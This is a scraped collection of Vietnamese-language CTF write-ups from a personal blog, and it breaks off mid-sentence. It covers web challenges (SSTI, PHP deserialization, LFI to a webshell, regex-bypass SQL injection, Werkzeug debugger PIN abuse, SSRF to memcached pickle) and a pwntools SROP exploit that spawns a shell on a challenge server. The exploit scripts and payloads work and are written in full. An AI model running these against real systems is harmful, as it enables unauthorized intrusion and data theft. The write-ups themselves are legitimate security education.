session.pop(\u0026#34;name\u0026#34;) session.pop(\u0026#34;jackpot\u0026#34;) except: pass if request.method == \u0026#34;POST\u0026#34;: ok = request.form[\u0026#39;ok\u0026#39;] session[\u0026#34;name\u0026#34;] = request.form[\u0026#39;name\u0026#39;] if ok == \u0026#34;Go\u0026#34;: session[\u0026#34;check\u0026#34;] = \u0026#34;access\u0026#34; jackpot = \u0026#34; \u0026#34;.join(str(x) for x in [ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99), ri(10,99)]).strip() session[\u0026#34;jackpot\u0026#34;] = jackpot return render_template_string(\u0026#34;Generating jackpot...\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/guess\u0026#39;; }, 500);\u0026lt;/script\u0026gt;\u0026#34;) return render_template(\u0026#34;start.html\u0026#34;) @app.route(\u0026#39;/guess\u0026#39;, methods=[\u0026#34;GET\u0026#34;,\u0026#34;POST\u0026#34;]) def guess(): try: if check_session(\u0026#34;check\u0026#34;) == \u0026#34;\u0026#34;: return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) else: if request.method == \u0026#34;POST\u0026#34;: jackpot_input = request.form[\u0026#39;jackpot\u0026#39;] if jackpot_input == check_session(\u0026#34;jackpot\u0026#34;): mess = \u0026#34;Really? GG \u0026#34;+check_session(\u0026#34;name\u0026#34;)+\u0026#34;, here your flag: ASCIS{xxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#34; elif jackpot_input != check_session(\u0026#34;jackpot\u0026#34;): mess = \u0026#34;May the Luck be with you next time!\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/reset_access\u0026#39;; }, 1200);\u0026lt;/script\u0026gt;\u0026#34; return render_template_string(mess) return render_template(\u0026#34;guess.html\u0026#34;) except: pass return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) @app.route(\u0026#39;/reset_access\u0026#39;) def reset(): try: session.pop(\u0026#34;check\u0026#34;) return render_template_string(\u0026#34;Reseting...\u0026lt;script\u0026gt;setInterval(function(){ window.location=\u0026#39;/\u0026#39;; }, 500);\u0026lt;/script\u0026gt;\u0026#34;) except: pass return render_template_string(cheat+check_session(\u0026#34;name\u0026#34;)) if __name__ == \u0026#34;__main__\u0026#34;: app.secret_key = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; app.run() C√°ch 1 ƒê√¢y l√† c√°ch m√¨nh s·ª≠ d·ª•ng ƒë·ªÉ solve trong l√∫c thi.\nPOST / name={% set x=session.update({\u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;, \u0026#39;jackpot\u0026#39;: \u0026#39;\u0026#39;}) %}\u0026amp;ok= POST /guess jackpot= C√°ch 2 Kh√¥ng khai th√°c SSTI, s∆∞u t·∫ßm t·ª´ c√°c ƒë·ªôi kh√°c sau khi thi.\nSubmit name b·∫•t k√¨ t·∫°i /, sau ƒë√≥ s·∫Ω ƒë∆∞·ª£c redirect sang /guess. # M√¥ t·∫£ session session = {\u0026#39;name\u0026#39;: \u0026#39;anything\u0026#39;, \u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;, \u0026#39;jackpot\u0026#39;: \u0026#39;xx xx xx xx xx xx\u0026#39;} Truy c·∫≠p l·∫°i v·ªÅ /. # M√¥ t·∫£ session session = {\u0026#39;check\u0026#39;: \u0026#39;access\u0026#39;} Quay tr·ªü l·∫°i /guess v√† submit v·ªõi 1 input r·ªóng (v√¨ h√†m check_session s·∫Ω tr·∫£ v·ªÅ chu·ªói r·ªóng n·∫øu key kh√¥ng t·ªìn t·∫°i). among_us Vi·∫øt PHP script ƒë·ªÉ generate ra ticket v√† password m·ªõi cho user \u0026lt;?php class CrewMate { public $name = \u0026#39;tsu\u0026#39;; public $secret_number = [1, 2, 3, 4, 5, 6, 7, 8, 9]; } $arr = new CrewMate; $se = serialize($arr); echo base64_encode($se) . PHP_EOL; $de = unserialize($se); $secret_number = strtoupper($de-\u0026gt;secret_number); $random_rand = rand(0, $secret_number); srand($random_rand); $new_password = \u0026#34;\u0026#34;; while (strlen($new_password) \u0026lt; 30) { $new_password .= strval(rand()); } echo \u0026#39;New password: \u0026#39; . $new_password . PHP_EOL; ?\u0026gt; Vi·∫øt Python script ƒë·ªÉ t·ª± ƒë·ªông h√≥a vi·ªác l·∫•y token ƒë·ªÉ ƒëƒÉng nh·∫≠p from re import findall from hashlib import md5 import requests REGEX_TOKEN = r\u0026#39;name=\u0026#34;token\u0026#34; value=\u0026#34;(.*?)\u0026#34;\u0026#39; PHPSESSID = \u0026#39;\u0026#39; # Nh·∫≠p PHPSESSID v√†o bi·∫øn while True: res = requests.get(\u0026#39;http://35.240.156.48/?page=forgot\u0026#39;, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post(\u0026#39;http://35.240.156.48/?page=forgot\u0026#39;, data={ \u0026#39;ticket\u0026#39;: \u0026#39;Tzo4OiJDcmV3TWF0ZSI6Mjp7czo0OiJu[redacted]\u0026#39;, # Ticket ƒë∆∞·ª£c l·∫•y t·ª´ PHP script ·ªü tr√™n \u0026#39;token\u0026#39;: token }, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) res = requests.get(\u0026#39;http://35.240.156.48/?page=login\u0026#39;, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) token = findall(REGEX_TOKEN, res.text)[0] res = requests.post(\u0026#39;http://35.240.156.48/?page=login\u0026#39;, data={ \u0026#39;username\u0026#39;: \u0026#39;tsu\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;117856802212731241191535857466\u0026#39;, # Password ƒë∆∞·ª£c l·∫•y t·ª´ PHP script ·ªü tr√™n \u0026#39;token\u0026#39;: token }, cookies={ \u0026#39;PHPSESSID\u0026#39;: PHPSESSID }) Ch·∫°y cho ƒë·∫øn khi script b·ªã l·ªói t·∫°i h√†m findall th√¨ d·ª´ng l·∫°i (v√¨ login xong s·∫Ω kh√¥ng c√≤n form login n·ªØa n√™n kh√¥ng th·ªÉ l·∫•y ƒë∆∞·ª£c token, d·∫´n ƒë·∫øn l·ªói).\nUpload 1 PHP webshell v√† server s·∫Ω t·∫°o 1 file zip ch·ª©a file m√¨nh m·ªõi upload l√™n v√† s·∫Ω ƒë∆∞·ª£c x√≥a cho ƒë·∫øn khi c√≥ 1 l∆∞·ª£t upload kh√°c. S·ª≠ d·ª•ng l·ªói LFI ·ªü trang index.php + zip wrapper (zip://) ƒë·ªÉ include PHP shell trong file zip =\u0026gt; RCE. L·∫•y flag ·ªü trong database. ","permalink":"https://blog.undo.pw/posts/ascis-2020-quals-web-short-writeup/","summary":"Short writeup for Web challenge that I solved in ASCIS 2020 Quals","title":"ASCIS 2020 Quals - Web short writeup"},{"content":"Foreword Theo nh∆∞ description c·ªßa ƒë·ªÅ th√¨ b√†i n√†y l√† s·ª± t·ªïng h·ª£p c·ªßa c√°c techniques nh∆∞:\nFormat String GOT (Global Offset Table) overwrite Buffer Overflow ROP (Return-Oriented Programming) sigreturn syscall (aka SROP) Th√¨ ch√∫ng ta ch·ªâ vi·ªác follow theo ƒë·∫•y m√† l√†m th√¥i.\nExploit Nh∆∞ ch√∫ng ta th·∫•y th√¨ NX v√† Canary ƒë·ªÅu ƒë∆∞·ª£c enabled (ƒë·∫°i kh√°i l√† kh√¥ng th·ªÉ ch·∫°y shellcode v√† buffer overflow nh∆∞ b√¨nh th∆∞·ªùng). Nh∆∞ng b√†i n√†y c√≥ Format String (ƒë·∫∑c tr∆∞ng c·ªßa l·ªói Format String l√† ch√∫ng ta c√≥ th·ªÉ ghi ƒë∆∞·ª£c m·ªçi address, mi·ªÖn l√† c√≥ quy·ªÅn write) n√™n ch√∫ng ta c√≥ th·ªÉ bypass ƒë∆∞·ª£c Canary.\nIdea Idea c·ªßa m√¨nh trong b√†i n√†y nh∆∞ sau:\nOverwrite __stack_chk_fail GOT address ƒë·ªÉ tr√°nh exit program khi ƒë√® qua canary Ghi chu·ªói format c·ªßa h√†m scanf l√™n section c√≥ quy·ªÅn write (·ªü ƒë√¢y l√† .bss section) L√†m cho register rax = 0xf khi ch·∫°y qua h√†m scanf ƒë·ªÉ g·ªçi sys_rt_sigreturn syscall Craft 1 stack frame b·∫±ng pwntools ƒë·ªÉ ch·∫°y sys_execve syscall Exploit Analyse from pwn import * binary = ELF(\u0026#39;./beginners_pwn\u0026#39;, checksec=False) p = remote(\u0026#39;35.221.81.216\u0026#39;, 30002) got_table = binary.symbols[\u0026#39;_GLOBAL_OFFSET_TABLE_\u0026#39;] start_main_ret = 0x401203 end_main_ret = 0x401256 pop_rdi_ret = 0x4012c3 pop_rsi_r15_ret = 0x4012c1 syscall = 0x40118f p.sendline((\u0026#39;%7$s%s\u0026#39;).ljust(8, \u0026#39;\\x00\u0026#39;) + p64(binary.symbols[\u0026#39;got.__stack_chk_fail\u0026#39;])) p.sendline(p64(end_main_ret)[:-1]) # ƒëo·∫°n n√†y slice ƒëi 1 byte cao ƒë·ªÉ kh√¥ng b·ªã ƒë√® v·ªõi h√†m ngay b√™n d∆∞·ªõi __stack_chk_fail l√† scanf p.sendline(\u0026#39;A\u0026#39;*24 + p64(end_main_ret) + p64(start_main_ret)) # ƒëo·∫°n n√†y ph·∫£i 16 bytes stack-aligned p.sendline((\u0026#39;%7$s%s\u0026#39;).ljust(8, \u0026#39;\\x00\u0026#39;) + p64(got_table+0x30)) p.sendline(\u0026#39;%1$s\u0026#39;*0xf) # ghi \u0026#39;%1$s\u0026#39; 15 l·∫ßn v√†o .bss payload = p64(pop_rdi_ret) payload += p64(got_table+0x30) payload += p64(pop_rsi_r15_ret) payload += p64(got_table+0x80) payload += p64(0) payload += p64(binary.symbols[\u0026#39;plt.__isoc99_scanf\u0026#39;]) # scanf(format=got_table+0x30, varargs=got_table+0x80) # sau khi nh·∫≠p 15 l·∫ßn \u0026#39;/bin/sh\u0026#39; (line 45) v√†o scanf th√¨ l√∫c ƒë√≥ rax=0xf v√† nh·∫£y v√†o syscall lu√¥n # \u0026#39;/bin/sh\u0026#39; s·∫Ω lu√¥n ƒë∆∞·ª£c ghi v√†o c√πng 1 ƒë·ªãa ch·ªâ l√† argument ƒë·∫ßu ti√™n (·ªü ƒë√¢y ch√≠nh l√† got_table+0x80) payload += p64(syscall) # Setup stack frame cho Sigreturn frame = SigreturnFrame(arch=\u0026#39;amd64\u0026#39;) frame.rax = 0x3b # sys_execve frame.rdi = got_table+0x80 # \u0026#39;/bin/sh\\x00\u0026#39; frame.rsi = 0 # reset rsi frame.rdx = 0 # reset rdx frame.rip = syscall # jump t·ªõi syscall address ƒë·ªÉ g·ªçi sys_execve payload += str(frame) p.sendline(\u0026#39;A\u0026#39;*24 + payload) p.sendlines([\u0026#39;/bin/sh\\x00\u0026#39;]*0xf) # G·ª≠i \u0026#39;/bin/sh\\x00\u0026#39; 15 l·∫ßn p.interactive() ","permalink":"https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/","summary":"Writeup for an easy Pwn challenge that I solved in TSGCTF 2020","title":"TSGCTF 2020 - Beginner's Pwn"},{"content":"WYSINWYG What you see is not what you get... Do you see the flag? then you don\u0026#39;t get the flag. T√°c gi·∫£ cho ta m·ªôt ƒëo·∫°n code PHP ng·∫Øn:\n\u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); include(\u0026#39;secret.php\u0026#39;); show_source(__FILE__); if (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;])) { $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if (!empty($a) \u0026amp;\u0026amp; !empty($b)) { if ($a === $b) { if (isset($_GET[\u0026#39;a‚Å°\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b‚Å¶\u0026#39;])) { $a = $_GET[\u0026#39;a‚Å°\u0026#39;]; $b = $_GET[\u0026#39;b‚Å¶\u0026#39;]; if ($a !== $b) { die($flag); } } } } } B√†i n√†y t√°c gi·∫£ ch√®n 2 k√≠ t·ª± zero-width space v√†o sau a v√† b ·ªü d√≤ng 11, 12 v√† 13.\nPoC:\n/?a=1\u0026amp;b=1\u0026amp;a%E2%81%A1=1\u0026amp;b%E2%81%A6=0 Secure System I created a security checker, can you help audit the source? Source: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view Source code ch·ªâ c√≥ 1 file index.php nh∆∞ sau:\n\u0026lt;?php require_once(\u0026#39;dbconnect.php\u0026#39;); $flag = mysqli_query($conn, \u0026#34;SELECT * FROM xxxxxxxxxxxxxxxxxxx\u0026#34;)-\u0026gt;fetch_assoc()[\u0026#39;yyyyyyyyyyyyyyyyyyyy\u0026#39;]; //Sorry It\u0026#39;s our secret, can\u0026#39;t share ?\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;center\u0026gt; Security Check!!! Please enter your ID to prove who are you !!!: \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;id\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;id\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;id\u0026#39;])) { if (preg_match(\u0026#39;/and|or|in|if|case|sleep|benchmark/is\u0026#39;, $_POST[\u0026#39;id\u0026#39;])) { die(\u0026#39;Tet nhat ai lai hack nhau :(, very dangerous key word\u0026#39;); } elseif (preg_match(\u0026#39;/order.+?by|union.+?select/is\u0026#39;, $_POST[\u0026#39;id\u0026#39;])) { die(\u0026#39;Tet nhat ai lai hack nhau :(, very dangerous statement\u0026#39;); } else { $user = mysqli_query($conn, \u0026#34;SELECT * FROM users WHERE id=\u0026#34; . $_POST[\u0026#39;id\u0026#39;])-\u0026gt;fetch_assoc()[\u0026#39;username\u0026#39;]; if ($user !== \u0026#39;admin\u0026#39;) { echo \u0026#39;Hello \u0026#39; . htmlentities($user); if ($user === \u0026#39;admin\u0026#39;) { echo \u0026#39;This can\\\u0026#39;t be =]] Just put here for fun lul\u0026#39;; die($flag); } } } } ?\u0026gt; D√≤ng 4 ch√∫ng ta c√≥ 1 hint c·ªßa t√°c gi·∫£ l√† ph·∫£i s·ª≠ d·ª•ng SQL Injection v√† leak ƒë∆∞·ª£c flag ·ªü 1 column Y v√† table X n√†o ƒë√≥ m√† ch√∫ng ta ch∆∞a bi·∫øt trong database.\nCh√∫ng ta b·ªã ch·∫∑n s·ª≠ d·ª•ng c√¢u l·ªánh order by v√† union select, ƒë·∫∑c bi·ªát l∆∞u √Ω l√† c·ª•m in c≈©ng b·ªã ch·∫∑n, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn s·∫Ω c√≥ ƒë√¥i ch√∫t kh√≥ khƒÉn ƒë·ªÉ ta l·∫•y ƒë∆∞·ª£c table name v√† column name t·ª´ information_schema c≈©ng nh∆∞ c√°c database c√≥ prefix innodb.\nNh∆∞ng ch√∫ng ta c√≥ th·ªÉ bypass preg_match ·ªü d√≤ng 21 b·∫±ng c√°ch l√†m cho PCRE (Engine x·ª≠ l√≠ Regular Expression trong PHP) x·ª≠ l√≠ input c·ªßa ta, l√†m cho v∆∞·ª£t qu√° backtrack limit m·∫∑c ƒë·ªãnh c·ªßa PHP. B·∫±ng c√°ch n√†y, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng order by hay union select d·ªÖ d√†ng.\nGet table name M√¨nh quy·∫øt ƒë·ªãnh s·ª≠ d·ª•ng view x$ps_schema_table_statistics_io c√≥ trong database sys v√¨ theo nh∆∞ MySQL documentation m√¥ t·∫£:\nThese views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first). v√† trong view n√†y c≈©ng c√≥ ch·ª©a 2 columns l√† table_schema v√† table_name.\nres = requests.post(\u0026#39;http://45.77.240.178:8002/index.php\u0026#39;, data={ \u0026#39;id\u0026#39;: \u0026#39;5 union/*\u0026#39; + \u0026#39;a\u0026#39;*1000000 + \u0026#39;*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()\u0026#39; }) Table name: Th1z_Fack1n_Fl4444g_Tabl3\nGet flag without knowing column name C√°ch n√†y ƒë√£ ƒë∆∞·ª£c anh @tsug0d m√¥ t·∫£ c·ª±c k√¨ chi ti·∫øt v√† d·ªÖ hi·ªÉu trong blog c·ªßa anh n√™n m√¨nh kh√¥ng d√†i d√≤ng n·ªØa. Get flag th√¥i!\nres = requests.post(\u0026#39;http://45.77.240.178:8002/index.php\u0026#39;, data={ \u0026#39;id\u0026#39;: \u0026#39;5 union/*\u0026#39; + \u0026#39;a\u0026#39;*1000000 + \u0026#39;*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x\u0026#39; }) Another way from the author üéâüéâüéâ\nThe Prophet Wohoo, wanna hear some oracle? B√†i n√†y ch·ªâ c√≥ 1 ch·ª©c nƒÉng c∆° b·∫£n l√† ƒë·ªçc c√°c file text c√≥ t√™n t·ª´ 1 - 5. Khi ta th·ª≠ file 6.txt, trang xu·∫•t hi·ªán giao di·ªán th√¥ng b√°o l·ªói c·ªßa Flask, ch·ª©ng t·ªè debug mode ƒëang ƒë∆∞·ª£c enabled. Trong giao di·ªán b√°o l·ªói, ch√∫ng ta c√≥ th·ªÉ ƒë·ªçc 1 ph·∫ßn source code ƒë√£ b·ªã disclosed:\nTa d·ªÖ d√†ng th·∫•y ƒë∆∞·ª£c l·ªói Local File Inclusion (LFI) trong ƒëo·∫°n code x·ª≠ l√≠ ƒë·ªçc file n√†y. Bi·∫øn filename ƒë∆∞·ª£c truy·ªÅn th·∫≥ng ƒë·∫øn h√†m open() v√† n·ªôi dung ƒë∆∞·ª£c ƒë∆∞a ra ngo√†i th√¥ng qua h√†m render_template().\nNgay l√∫c n√†y, m√¨nh nh·∫≠n ra r·∫±ng vi·ªác ch√∫ng ta c√≥ l·ªói LFI s·∫Ω d·∫´n ƒë·∫øn vi·ªác c√≥ th·ªÉ generate ƒë∆∞·ª£c debugger PIN code, sau ƒë√≥ s·ª≠ d·ª•ng ch·ª©c nƒÉng Interactive shell ƒë∆∞·ª£c t√≠ch h·ª£p trong giao di·ªán l·ªói c·ªßa Flask ƒë·ªÉ c√≥ th·ªÉ leverage l√™n RCE.\nSau khi l√†m theo b√†i h∆∞·ªõng d·∫´n generate PIN code v√† ƒë√£ c√≥ ƒë∆∞·ª£c PIN, gi·ªù ch·ªâ vi·ªác submit PIN v√† RCE th√¥i, nh∆∞ng ƒë·ªùi kh√¥ng nh∆∞ m∆° v√† cu·ªôc s·ªëng kh√¥ng d·ªÖ th·ªü\u0026hellip;\nOk, t·ª± trong ƒë·∫ßu nghƒ© ch·∫Øc ƒë√¢y c≈©ng l√† √Ω c·ªßa t√°c gi·∫£ th√¥i, ch·∫Øc c√≥ ch·ªó n√†o ƒë√¢u ƒë√≥ trong ph·∫ßn x·ª≠ l√≠ nh·∫≠p PIN n√†y c√≥ th·ªÉ v∆∞·ª£t ƒë∆∞·ª£c, let check it out. üßê\n# https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py # ... def hash_pin(pin): if isinstance(pin, text_type): pin = pin.encode(\u0026#34;utf-8\u0026#34;, \u0026#34;replace\u0026#34;) return hashlib.md5(pin + b\u0026#34;shittysalt\u0026#34;).hexdigest()[:12] # ... class DebuggedApplication(object): # ... def check_pin_trust(self, environ): \u0026#34;\u0026#34;\u0026#34;Checks if the request passed the pin test. This returns `True` if the request is trusted on a pin/cookie basis and returns `False` if not. Additionally if the cookie\u0026#39;s stored pin hash is wrong it will return `None` so that appropriate action can be taken. \u0026#34;\u0026#34;\u0026#34; if self.pin is None: return True val = parse_cookie(environ).get(self.pin_cookie_name) if not val or \u0026#34;|\u0026#34; not in val: return False ts, pin_hash = val.split(\u0026#34;|\u0026#34;, 1) if not ts.isdigit(): return False if pin_hash != hash_pin(self.pin): return None return (time.time() - PIN_TIME) \u0026lt; int(ts) def pin_auth(self, request): \u0026#34;\u0026#34;\u0026#34;Authenticates with the pin.\u0026#34;\u0026#34;\u0026#34; exhausted = False auth = False trust = self.check_pin_trust(request.environ) # If the trust return value is `None` it means that the cookie is # set but the stored pin hash value is bad. This means that the # pin was changed. In this case we count a bad auth and unset the # cookie. This way it becomes harder to guess the cookie name # instead of the pin as we still count up failures. bad_cookie = False if trust is None: self._fail_pin_auth() bad_cookie = True # If we\u0026#39;re trusted, we\u0026#39;re authenticated. elif trust: auth = True # If we failed too many times, then we\u0026#39;re locked out. elif self._failed_pin_auth \u0026gt; 10: exhausted = True # Otherwise go through pin based authentication else: entered_pin = request.args.get(\u0026#34;pin\u0026#34;) if entered_pin.strip().replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) == self.pin.replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;): self._failed_pin_auth = 0 auth = True else: self._fail_pin_auth() rv = Response( json.dumps({\u0026#34;auth\u0026#34;: auth, \u0026#34;exhausted\u0026#34;: exhausted}), mimetype=\u0026#34;application/json\u0026#34;, ) if auth: rv.set_cookie( self.pin_cookie_name, \u0026#34;%s|%s\u0026#34; % (int(time.time()), hash_pin(self.pin)), httponly=True, ) elif bad_cookie: rv.delete_cookie(self.pin_cookie_name) return rv # ... Hai d√≤ng ƒë∆∞·ª£c highlight l√† c√¢u l·ªánh if ki·ªÉm tra ƒëi·ªÅu ki·ªán n·∫øu nh·∫≠p sai qu√° 10 l·∫ßn th√¨ exhausted = True, t·ª´ ƒë√≥ ta suy ra ƒë√£ c√≥ ng∆∞·ªùi submit sai PIN kho·∫£ng 7 - 8 l·∫ßn tr∆∞·ªõc ƒë√≥, ƒë·ªÉ ƒë·∫øn l∆∞·ª£t m√¨nh th√¨ sau khi th·ª≠ 2 - 3 m√£ PIN th√¨ n√≥ l√™n 10. üò§\nOk, quay l·∫°i n√†o. V√¨ c√¢u ƒëi·ªÅu ki·ªán check nh·∫≠p sai n·∫±m trong nh√°nh elif n√™n ch·ªâ c·∫ßn 2 c√¢u ƒëi·ªÅu ki·ªán ·ªü tr√™n ƒë√∫ng th√¨ s·∫Ω kh√¥ng th·ª±c thi. Bi·∫øn trust ƒë∆∞·ª£c kh·ªüi t·∫°o v·ªõi value l√† return value c·ªßa h√†m check_pin_trust(), h√†m n√†y th·ª±c hi·ªán get v√† parse cookie, ki·ªÉm tra PIN hash trong cookie c√≥ ƒë√∫ng v·ªõi PIN hash tr√™n server hay kh√¥ng, PIN expired time c√≥ h·∫øt h·∫°n hay ch∆∞a.\nV√¨ ch√∫ng ta c√≥ th·ªÉ control ƒë∆∞·ª£c cookie n√™n ta c√≥ th·ªÉ t√πy bi·∫øn ƒë∆∞·ª£c cookie ƒë·ªÉ v∆∞·ª£t qua ƒë∆∞·ª£c vi·ªác check exhausted. M√¨nh ƒë√£ c√≥ quy·ªÅn ch·∫°y Python code tr√™n interactive shell r·ªìi, t√¨m v√† ƒë·ªçc flag r·∫•t d·ªÖ d√†ng.\nAuthor n√≥i g√¨? Ok, gi·∫£i xong inbox author th√¨ ·∫£nh b·∫£o ch·ªâ c·∫ßn generate PIN code l√† xong r·ªìi RCE l·∫•y flag th√¥i, t·∫°i l√∫c ƒë√≥ setup c√≥ v·∫•n ƒë·ªÅ n√™n m·ªõi b·ªã exhausted. üò§\nMeePwnTube2050 Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view B√†i n√†y m√¨nh stuck ƒë·∫øn ng√†y h√¥m sau m·ªõi nghƒ© ƒë∆∞·ª£c h∆∞·ªõng üòÖ\nV√¨ m√¨nh ng√¢m ƒëi ng√¢m l·∫°i source code nhi·ªÅu l·∫ßn ƒë·ªÉ ch·∫Øc ch·∫Øn r·∫±ng kh√¥ng c√≥ 1 l·ªói n√†o c√≥ th·ªÉ x·∫£y ra, v√† ƒë·∫øn khi m√¨nh ch·ª£t ƒë·ªÉ √Ω 1 chi ti·∫øt nh·ªè trong search.php:\n\u0026lt;?php include \u0026#34;dbconnect.php\u0026#34;; $_IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; if (isset($_GET[\u0026#39;search\u0026#39;])) { if ($_IP === \u0026#34;45.76.148.212\u0026#34;){ //local only homie $Name = $_GET[\u0026#39;search\u0026#39;]; $_search = mysqli_real_escape_string($admin_conn,$Name); $Execquery = mysqli_query($admin_conn, \u0026#34;SELECT id,Name FROM search WHERE Name LIKE \u0026#39;%$_search%\u0026#39; LIMIT 8\u0026#34;); while ($Result = mysqli_fetch_array($Execquery)) { echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;b\u0026gt;\u0026lt;p style=\u0026#39;font-size:20px; color:green\u0026#39;\u0026gt;\u0026#34;.$Result[\u0026#39;Name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;iframe src=\u0026#39;video\u0026#34;.$Result[\u0026#39;id\u0026#39;].\u0026#34;.php\u0026#39; width=\u0026#39;1200\u0026#39; height=\u0026#39;300\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; } } else { $Name = $_GET[\u0026#39;search\u0026#39;]; $_search = mysqli_real_escape_string($conn,$Name); $Execquery = mysqli_query($conn, \u0026#34;SELECT id,Name FROM search WHERE Name LIKE \u0026#39;%$_search%\u0026#39; LIMIT 8\u0026#34;); while ($Result = mysqli_fetch_array($Execquery)) { echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;b\u0026gt;\u0026lt;p style=\u0026#39;font-size:20px; color:green\u0026#39;\u0026gt;\u0026#34;.$Result[\u0026#39;Name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;iframe src=\u0026#39;video\u0026#34;.$Result[\u0026#39;id\u0026#39;].\u0026#34;.php\u0026#39; width=\u0026#39;1200\u0026#39; height=\u0026#39;300\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; } } } ?\u0026gt; T·∫°i d√≤ng 10 n·∫øu IP l√† 45.76.148.212 (c≈©ng l√† IP c·ªßa bot) th√¨ n√≥ s·∫Ω l·∫•y gi√° tr·ªã t·ª´ DB_ADMIN ch·ª© kh√¥ng ph·∫£i l·∫•y gi√° tr·ªã t·ª´ DB th∆∞·ªùng. T·ª´ ƒë√≥ l√†m m√¨nh nghƒ© ngay t·ªõi b√†i secret note keeper trong gi·∫£i Facebook CTF 2019 m√† anh @ducnt ƒë√£ gi·∫£i v√† vi·∫øt writeup tr∆∞·ªõc ƒë√≥.\nPh·∫ßn c√≤n l·∫°i ƒë·ªÉ c√°c b·∫°n tr·∫£ l·ªùi\u0026hellip; üò™\nHelloVietNamv2 https://www.youtube.com/watch?v=ZqjhmdRgXMw\nSource: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view B√†i n√†y c≈©ng l√† 1 b√†i b·ªã setup l·ªói, d·∫´n ƒë·∫øn nhi·ªÅu team trong ƒë√≥ c√≥ m√¨nh gi·∫£i theo h∆∞·ªõng unintended (Command Injection) thay v√¨ intended (Memcached Injection). Trong ph·∫ßn n√†y m√¨nh s·∫Ω ch·ªâ n√≥i v·ªÅ c√°ch intended c·ªßa t√°c gi·∫£.\nWhere\u0026rsquo;s the real bug in the source code? # ... @app.route(\u0026#39;/loadexternalvideo\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def loadexternalvideo(): if session.get(\u0026#39;user\u0026#39;): if request.method == \u0026#39;POST\u0026#39;: # ... _url = request.form[\u0026#39;video_url\u0026#39;] # ... file = parse(_url) # ... # ... N·∫øu c√°c b·∫°n ƒë·ªÉ √Ω t·∫°i h√†m x·ª≠ l√≠ route /loadexternalvideo s·∫Ω th·∫•y 1 l·ªói SSRF. H√†m parse() s·ª≠ d√πng PyCurl ƒë·ªÉ request. Theo nh∆∞ documentation th√¨ PyCurl l√† 1 interface c·ªßa libcurl v√† ƒë√¢y l√† nh·ªØng protocol libcurl h·ªó tr·ª£:\nV·∫≠y l√† ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng Gopher protocol, sound good!\nV·∫≠y Memcached Injection n·∫±m ·ªü ƒë√¢u? N·∫±m ·ªü ch·ªó s·ª≠ d·ª•ng th∆∞ vi·ªán pylibmc trong Python. N·∫øu ai ƒë√£ ƒë·ªçc qua slide ƒë∆∞·ª£c tr√¨nh b√†y t·∫°i h·ªôi ngh·ªã Black Hat th√¨ c≈©ng ƒë√£ th·∫•y c√°i table n√†y:\nCh√∫ng ta c√≥ th·ªÉ th·∫•y, n·∫øu d·ªØ li·ªáu ch√∫ng ta set v√†o key l√† 1 Pickle serialized data th√¨ khi get c√°i key n√†y, t√πy theo flags m√† ch√∫ng ta g·ª≠i l√™n m√† pylibmc c√≥ deserialize Pickle hay kh√¥ng.\nFlag for Pickle deserialization: (1 \u0026lt;\u0026lt; 0) = 1\nV·∫≠y ch√∫ng ta trigger 